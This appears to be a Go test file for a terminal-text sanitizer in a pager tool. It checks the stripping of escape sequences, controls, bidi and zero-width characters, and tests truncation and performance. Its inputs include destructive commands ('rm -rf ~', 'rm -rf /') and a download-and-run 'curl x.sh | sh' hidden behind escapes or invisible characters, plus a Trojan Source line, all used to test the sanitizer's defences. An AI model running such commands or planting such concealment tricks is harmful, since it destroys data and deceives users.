package sanitize

import (
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/MaverickHQ/herdr-pager/bridge/internal/captures"
)

// The invisible code points the cases use, built from their numbers so that
// the source shows where each one stands.
var (
	rlo   = string(rune(0x202E)) // RIGHT-TO-LEFT OVERRIDE
	lri   = string(rune(0x2066)) // LEFT-TO-RIGHT ISOLATE
	pdi   = string(rune(0x2069)) // POP DIRECTIONAL ISOLATE
	zwsp  = string(rune(0x200B)) // ZERO WIDTH SPACE
	zwj   = string(rune(0x200D)) // ZERO WIDTH JOINER
	bom   = string(rune(0xFEFF)) // ZERO WIDTH NO-BREAK SPACE, the BOM
	acute = string(rune(0x0301)) // COMBINING ACUTE ACCENT
)

// A tcase is one input, the limit it's sanitized to and the expected output,
// all written by hand.
type tcase struct {
	name, in string
	limit    int
	want     string
}

func run(t *testing.T, cases []tcase) {
	t.Helper()
	for _, c := range cases {
		if got := Text(c.in, c.limit); got != c.want {
			t.Errorf("%s: Text(%q, %d) = %q, want %q", c.name, c.in, c.limit, got, c.want)
		}
	}
}

// TestSanitizeStripsAnsi: CSI, OSC and DCS sequences, and the other escapes
// a terminal acts on, are removed with their parameters and payloads; the
// text around them stays (parent design §Sanitizer, step 1). A control
// string with no terminator loses only its introducer, and a C1 code point
// is one control, never an introducer: neither can hide the rest of a field
// (amended 2026-11-01, the security pass).
func TestSanitizeStripsAnsi(t *testing.T) {
	run(t, []tcase{
		{"no escapes", "npm test -- --watch=false", Line, "npm test -- --watch=false"},

		// CSI: ESC [, parameters, intermediates, one final byte.
		{"CSI colour", "\x1b[31mred\x1b[0m", Line, "red"},
		{"CSI colours", "\x1b[1;32mbold green\x1b[m text", Line, "bold green text"},
		{"CSI 256 colour", "\x1b[38;5;208morange\x1b[39m", Line, "orange"},
		{"CSI erase and move", "a\x1b[2Kb\x1b[10;20Hc", Line, "abc"},
		{"CSI private mode", "\x1b[?25lhidden\x1b[?25h", Line, "hidden"},
		{"CSI intermediate", "\x1b[1 qcursor", Line, "cursor"},
		{"CSI 8-bit: one control", "\u009b31mred\u009b0m", Line, "31mred0m"},

		// OSC: ESC ], ended by BEL or ST (ESC \).
		{"OSC title, BEL", "\x1b]0;evil title\x07ok", Line, "ok"},
		{"OSC hyperlink, ST", "\x1b]8;;https://example.com\x1b\\link\x1b]8;;\x1b\\", Line, "link"},
		{"OSC clipboard", "\x1b]52;c;ZWNobyBoaQ==\x07after", Line, "after"},
		{"OSC 8-bit: one control", "\u009d0;title\u009cok", Line, "0;titleok"},
		{"OSC unterminated: its introducer only", "before\x1b]0;never ends", Line, "before0;never ends"},
		{"OSC unterminated hides no command", "echo hi \x1b]; rm -rf ~", Line, "echo hi ; rm -rf ~"},
		{"OSC 8-bit hides no command", "echo hi \u009d; rm -rf ~", Line, "echo hi ; rm -rf ~"},

		// DCS: ESC P, ended by ST.
		{"DCS sixel", "\x1bPq#0;2;0;0;0#1!20~\x1b\\after", Line, "after"},
		{"DCS request", "\x1bP$q\"p\x1b\\done", Line, "done"},
		{"DCS 8-bit: one control", "\u0090$q\"p\u009cdone", Line, "$q\"pdone"},
		{"DCS unterminated: its introducer only", "kept\x1bP1;2|payload", Line, "kept1;2|payload"},

		// The other strings a terminal swallows: SOS, PM and APC.
		{"SOS", "a\x1bXhidden\x1b\\b", Line, "ab"},
		{"PM", "a\x1b^hidden\x1b\\b", Line, "ab"},
		{"APC", "a\x1b_hidden\x1b\\b", Line, "ab"},
		{"APC unterminated: its introducer only", "a\x1b_shown", Line, "ashown"},
		{"SOS, PM and APC 8-bit: one control each", "a\u0098b\u009ec\u009fd", Line, "abcd"},
		{"an escape inside an unterminated string", "\x1b]0;x\x1b[31m y", Line, "0;x y"},

		// Two- and three-byte escapes, and a lone ESC.
		{"charset", "\x1b(Bplain", Line, "plain"},
		{"keypad", "\x1b=keypad\x1b>", Line, "keypad"},
		{"save and restore", "\x1b7saved\x1b8", Line, "saved"},
		{"lone ST", "x\x1b\\y", Line, "xy"},
		{"ESC at the end", "end\x1b", Line, "end"},
	})
}

// TestSanitizeRemovesBidiAndZeroWidth: every code point in parent design
// §Sanitizer, step 3, vanishes wherever it stands: the bidi embeddings and
// overrides (U+202A to U+202E), the isolates (U+2066 to U+2069) and the
// zero-width characters (U+200B to U+200D, U+FEFF, U+2060). A "Trojan Source"
// line, which reads differently from how it runs, keeps its logical order.
func TestSanitizeRemovesBidiAndZeroWidth(t *testing.T) {
	invisible := []rune{
		0x202A, 0x202B, 0x202C, 0x202D, 0x202E, // LRE, RLE, PDF, LRO, RLO
		0x2066, 0x2067, 0x2068, 0x2069, // LRI, RLI, FSI, PDI
		0x200B, 0x200C, 0x200D, // ZWSP, ZWNJ, ZWJ
		0xFEFF, // ZWNBSP, the BOM
		0x2060, // WJ
	}
	var cases []tcase
	for _, r := range invisible {
		u := fmt.Sprintf("U+%04X", r)
		cases = append(cases,
			tcase{u + " inside", "rm" + string(r) + " -rf", Line, "rm -rf"},
			tcase{u + " first", string(r) + "git push", Line, "git push"},
			tcase{u + " last", "deny" + string(r), Line, "deny"},
			tcase{u + " doubled", "a" + string(r) + string(r) + "b", Line, "ab"},
		)
	}
	cases = append(cases,
		tcase{"all of them", "x" + string(invisible) + "y", Line, "xy"},
		tcase{"Trojan Source", "if level != \"user" + rlo + " " + lri + "// admin?" + pdi + " " + lri + "\" {", Line,
			"if level != \"user // admin? \" {"},
		tcase{"a zero-width split", "r" + zwsp + "m -" + zwj + "rf /", Line, "rm -rf /"},
	)
	run(t, cases)
}

// TestSanitizeRemovesControls: the C0 controls but `\n` (which step 5 folds),
// DEL, and the C1 controls are removed wherever they stand (parent design
// §Sanitizer, step 2). The tab is a C0 control like the others: the design
// excepts only `\n`. ESC begins a sequence, so step 1 removes it with what
// follows (TestSanitizeStripsAnsi). Every C1 code point is one control here,
// the 8-bit forms of CSI, DCS, OSC, SOS, PM, APC and ST included: in decoded
// text none begins a sequence (amended 2026-11-01, the security pass).
func TestSanitizeRemovesControls(t *testing.T) {
	var controls []rune
	for r := rune(0x00); r <= 0x1F; r++ {
		if r != '\n' && r != 0x1B {
			controls = append(controls, r)
		}
	}
	controls = append(controls, 0x7F) // DEL
	for r := rune(0x80); r <= 0x9F; r++ {
		controls = append(controls, r)
	}
	var cases []tcase
	for _, r := range controls {
		u := fmt.Sprintf("U+%04X", r)
		cases = append(cases,
			tcase{u + " inside", "rm" + string(r) + " -rf", Line, "rm -rf"},
			tcase{u + " first", string(r) + "git push", Line, "git push"},
			tcase{u + " last", "deny" + string(r), Line, "deny"},
		)
	}
	cases = append(cases,
		tcase{"all of them", "x" + string(controls) + "y", Line, "xy"},
		tcase{"NUL", "before\x00after", Line, "beforeafter"},
		tcase{"CR LF", "one line\r", Line, "one line"},
		tcase{"backspaces show both", "safe\b\b\b\bevil", Line, "safeevil"},
		tcase{"CR overwrite shows both", "ls\rrm -rf ~", Line, "lsrm -rf ~"},
		tcase{"tab", "a\tb", Line, "ab"},
		tcase{"NEL", "a\u0085b", Line, "ab"},
	)
	run(t, cases)
}

// wide is a limit no case below reaches, for tests of the steps before
// truncation.
const wide = 200

// TestSanitizeTransliteratesThenReplaces: each transliteration in parent
// design §Sanitizer, step 4, then `?` for every other non-ASCII rune, one per
// rune.
func TestSanitizeTransliteratesThenReplaces(t *testing.T) {
	// The box-drawing block, U+2500 to U+257F, in order: its straight lines
	// (light, heavy, dashed, double, and the half lines) become `-` or `|`;
	// its corners, tees, crosses, arcs and diagonals become `+`.
	var box []rune
	for r := rune(0x2500); r <= 0x257F; r++ {
		box = append(box, r)
	}
	boxWant := "--||--||--||" + // U+2500 to U+250B: the lines, light and heavy, plain and dashed
		strings.Repeat("+", 64) + // U+250C to U+254B: corners, tees and crosses
		"--||" + // U+254C to U+254F: the double-dash lines
		"-|" + // U+2550, U+2551: the double lines
		strings.Repeat("+", 34) + // U+2552 to U+2573: double corners, tees, crosses; arcs; diagonals
		"-|-|-|-|-|-|" // U+2574 to U+257F: the half lines

	run(t, []tcase{
		// The table.
		{"❯", "❯ 1. Yes", Line, "> 1. Yes"},
		{"› and »", "a › b » c", Line, "a > b > c"},
		{"…", "Waiting…", Line, "Waiting.."},
		{"– and —", "a – b — c", Line, "a - b - c"},
		{"‘ and ’", "‘single’", Line, "'single'"},
		{"“ and ”", "“double”", Line, "\"double\""},
		{"the box-drawing block", string(box), wide, boxWant},
		{"a rounded box", "╭───╮", Line, "+---+"},
		{"a box's side", "│ hi │", Line, "| hi |"},
		{"Claude's dashed rule", "╌╌╌╌", Line, "----"},
		{"a heavy frame", "┏━┳━┓", Line, "+-+-+"},

		// Then a `?` for each other non-ASCII rune.
		{"accent", "café", Line, "caf?"},
		{"CJK", "日本", Line, "??"},
		{"emoji", "🚀 go", Line, "? go"},
		{"ballot box", "☐ Colour", Line, "? Colour"},
		{"check mark", "✔ done", Line, "? done"},
		{"no-break space", "a b", Line, "a?b"},
		{"combining accent", "e" + acute, Line, "e?"},
		{"fullwidth letters", "ｒｍ -rf", Line, "?? -rf"},
		{"an arrow not in the table", "a ← b", Line, "a ? b"},
		{"invalid UTF-8", "\xffok\xc3", Line, "?ok?"},
		{"the replacement character", "�", Line, "?"},
		{"a ZWJ emoji", "👨" + zwj + "👩" + zwj + "👧", Line, "???"},
		{"ASCII stays", "x !\"#$%&'()*+,-./09:;<=>?@AZ[\\]^_`az{|}~", wide,
			"x !\"#$%&'()*+,-./09:;<=>?@AZ[\\]^_`az{|}~"},
	})
}

// TestSanitizeFoldsWhitespace: a run of spaces and newlines becomes one
// space, and a field starts and ends with neither (parent design §Sanitizer,
// step 5). A field is one line on the pager, so `\n` folds too. Folding comes
// after the removals, so spaces that meet once an escape, a control or an
// invisible rune between them is gone fold as well.
func TestSanitizeFoldsWhitespace(t *testing.T) {
	run(t, []tcase{
		{"one space stays", "npm test", Line, "npm test"},
		{"a run of spaces", "npm    test", Line, "npm test"},
		{"leading", "   touch approved.txt", Line, "touch approved.txt"},
		{"trailing", "Bash command   ", Line, "Bash command"},
		{"a newline", "first\nsecond", Line, "first second"},
		{"newlines and spaces", "a \n\n  \n b", Line, "a b"},
		{"only whitespace", " \n \n ", Line, ""},
		{"empty", "", Line, ""},
		{"around an escape", "a \x1b[0m b", Line, "a b"},
		{"around a control", "a \x00\t b", Line, "a b"},
		{"around an invisible", "a " + zwsp + " " + rlo + " b", Line, "a b"},
		{"a CR LF ending", "line one\r\nline two\r\n", Line, "line one line two"},
		{"a no-break space is not a space", "a  b", Line, "a? b"},
	})
}

// TestSanitizeTruncatesHeadAndTail: a field longer than its limit keeps its
// head and its tail around "..", exactly at the limit (parent design
// §Sanitizer, step 6; parent 7.2). The head takes the odd character; below 3
// there's no room for the marker, so the head alone is kept. The limit counts
// the field as it will show, after transliterating and folding.
func TestSanitizeTruncatesHeadAndTail(t *testing.T) {
	a, c := strings.Repeat("a", 20), strings.Repeat("c", 20)
	run(t, []tcase{
		// Line: a card's summary and lines, 40.
		{"line at its limit", strings.Repeat("x", 40), Line, strings.Repeat("x", 40)},
		{"line one over", a + "b" + c, Line, a[:19] + ".." + c[:19]},
		{"a long command", "npm test -- --watch=false --coverage --reporter=verbose", Line,
			"npm test -- --watch.. --reporter=verbose"},

		// Name: an agent's display name, 24.
		{"name at its limit", "abcdefghijklmnopqrstuvwx", Name, "abcdefghijklmnopqrstuvwx"},
		{"name one over", "abcdefghijklmnopqrstuvwxy", Name, "abcdefghijk..opqrstuvwxy"},
		{"a long name", "api-refactor-with-a-very-long-name", Name, "api-refacto..y-long-name"},

		// Kind: an agent kind, 10.
		{"kind at its limit", "claude-cli", Kind, "claude-cli"},
		{"a long kind", "claude-code-cli", Kind, "clau..-cli"},

		// The limit counts what shows.
		{"after transliterating", strings.Repeat("a", 39) + "…", Line,
			strings.Repeat("a", 19) + ".." + strings.Repeat("a", 17) + ".."},
		{"after folding", "a" + strings.Repeat(" ", 50) + "b", Kind, "a b"},
		{"after stripping", "\x1b[31m" + "short" + "\x1b[0m", Kind, "short"},

		// Other limits.
		{"odd limit", "abcdefghijkl", 9, "abcd..jkl"},
		{"limit 4", "abcde", 4, "a..e"},
		{"limit 3", "abcd", 3, "a.."},
		{"limit 2", "abc", 2, "ab"},
		{"limit 1", "abc", 1, "a"},
		{"limit 0", "abc", 0, ""},
		{"negative limit", "abc", -1, ""},
	})
}

// FuzzSanitizeOutputIsPrintableWithinLimit: whatever the text and the limit,
// Text returns only printable ASCII (0x20 to 0x7E), and at most limit
// characters (none for a negative limit). The seeds are edge cases written by
// hand and phase 0's detection captures, whole and line by line, read through
// their manifest. The gate runs it for 60 s.
func FuzzSanitizeOutputIsPrintableWithinLimit(f *testing.F) {
	for _, s := range []string{
		"", " ", "\n", "plain", "\x1b", "\x1b[", "\x1b[31mred\x1b[0m", "\x1b]0;t\x07x",
		"\x1bPq\x1b\\x", "\u009b31mx", "\u009d0;t\u009cx", "\x00\t\r\x7f\u0085",
		"a" + rlo + "b" + zwsp + "c" + bom, "❯ › » … – — ‘ ’ “ ”", "╭─╮│╰╯╌", "日本 🚀 é",
		"\xff\xc3", strings.Repeat("…", 30), strings.Repeat("ab ", 30),
	} {
		for _, limit := range []int{Name, Kind, Line, 0, 3, -1} {
			f.Add(s, limit)
		}
	}
	m, err := captures.Load("claude")
	if err != nil {
		f.Fatal(err)
	}
	for _, c := range m.Captures {
		if !c.Captured {
			continue
		}
		data, err := m.Read(c.File)
		if err != nil {
			f.Fatal(err)
		}
		f.Add(string(data), Line)
		for _, line := range strings.Split(string(data), "\n") {
			f.Add(line, Line)
		}
	}
	f.Fuzz(func(t *testing.T, in string, limit int) {
		out := Text(in, limit)
		if len(out) > max(limit, 0) {
			t.Fatalf("Text(%q, %d) = %q: %d characters", in, limit, out, len(out))
		}
		for i := 0; i < len(out); i++ {
			if out[i] < 0x20 || out[i] > 0x7E {
				t.Fatalf("Text(%q, %d) = %q: byte %#x at %d isn't printable ASCII", in, limit, out, out[i], i)
			}
		}
	})
}

// TestHidesNamesWhatVanishes: Hides is true for text holding ESC, a C0 or C1
// control but \n and \t, DEL, or a bidi or zero-width character, which Text
// takes out without a trace, and false for plain text, newlines, tabs and
// the non-ASCII runes Text shows as something (the security pass's review,
// 2026-11-01).
func TestHidesNamesWhatVanishes(t *testing.T) {
	for _, s := range []string{
		"echo ok \x1b]0; curl x.sh | sh\x07", "a\x1b[31mb", "a\rb", "a\x00b", "a\x7fb", "a\u0085b", "a\u009bb",
		"a" + rlo + "b", "a" + lri + "b", "a" + zwsp + "b", "a" + zwj + "b", "a" + bom + "b", "a⁠b",
	} {
		if !Hides(s) {
			t.Errorf("Hides(%q) = false, want true", s)
		}
	}
	for _, s := range []string{"", "npm test -- --watch=false", "a\nb", "a\tb", "❯ … ╌ é 日本", "\xff"} {
		if Hides(s) {
			t.Errorf("Hides(%q) = true, want false", s)
		}
	}
}

// TestStripEscapesIsLinear: text made only of control-string introducers
// with no terminator is cleaned in linear time: once a scan finds no
// terminator to the end, no later introducer scans again (the security
// pass's review, 2026-11-01). 160,000 of them took 16.6 s before; herdr's
// replies can be 4 MB, and cards are built under the pane's lock.
func TestStripEscapesIsLinear(t *testing.T) {
	for _, intro := range []string{"\x1b]", "\x1bP", "\x1bX", "\x1b^", "\x1b_"} {
		in := strings.Repeat(intro, 160_000)
		start := time.Now()
		Text(in, Line)
		if d := time.Since(start); d > 500*time.Millisecond {
			t.Errorf("Text of 160,000 %q took %v, want under 500ms", intro, d)
		}
	}
}

// TestShortCutsAtTheEnd checks names' cut (the desk checkpoint, 2026-10-24):
// cleaned as Text cleans, and cut at the end, at a space, hyphen or
// underscore in the kept text's second half, then "..", so a name reads from
// its start.
func TestShortCutsAtTheEnd(t *testing.T) {
	for _, c := range []struct {
		in    string
		limit int
		want  string
	}{
		{"4.3 build-session", Name, "4.3 build-session"},
		{"Draft the release notes for v0.1.0 today", Name, "Draft the release.."},
		{"5.7 live-coding-session-for-the-take-home", Name, "5.7 live-coding.."},
		{"abcdefghijklmnopqrstuvwxyz0123", Name, "abcdefghijklmnopqrstuv.."}, // no word to cut at
		{"\x1b[1mfireworks-take-home\x1b[0m", At, "fireworks-take.."},
		{"herdr-pager", At, "herdr-pager"},
	} {
		if got := Short(c.in, c.limit); got != c.want || len(got) > c.limit {
			t.Errorf("Short(%q, %d) = %q; want %q", c.in, c.limit, got, c.want)
		}
	}
}
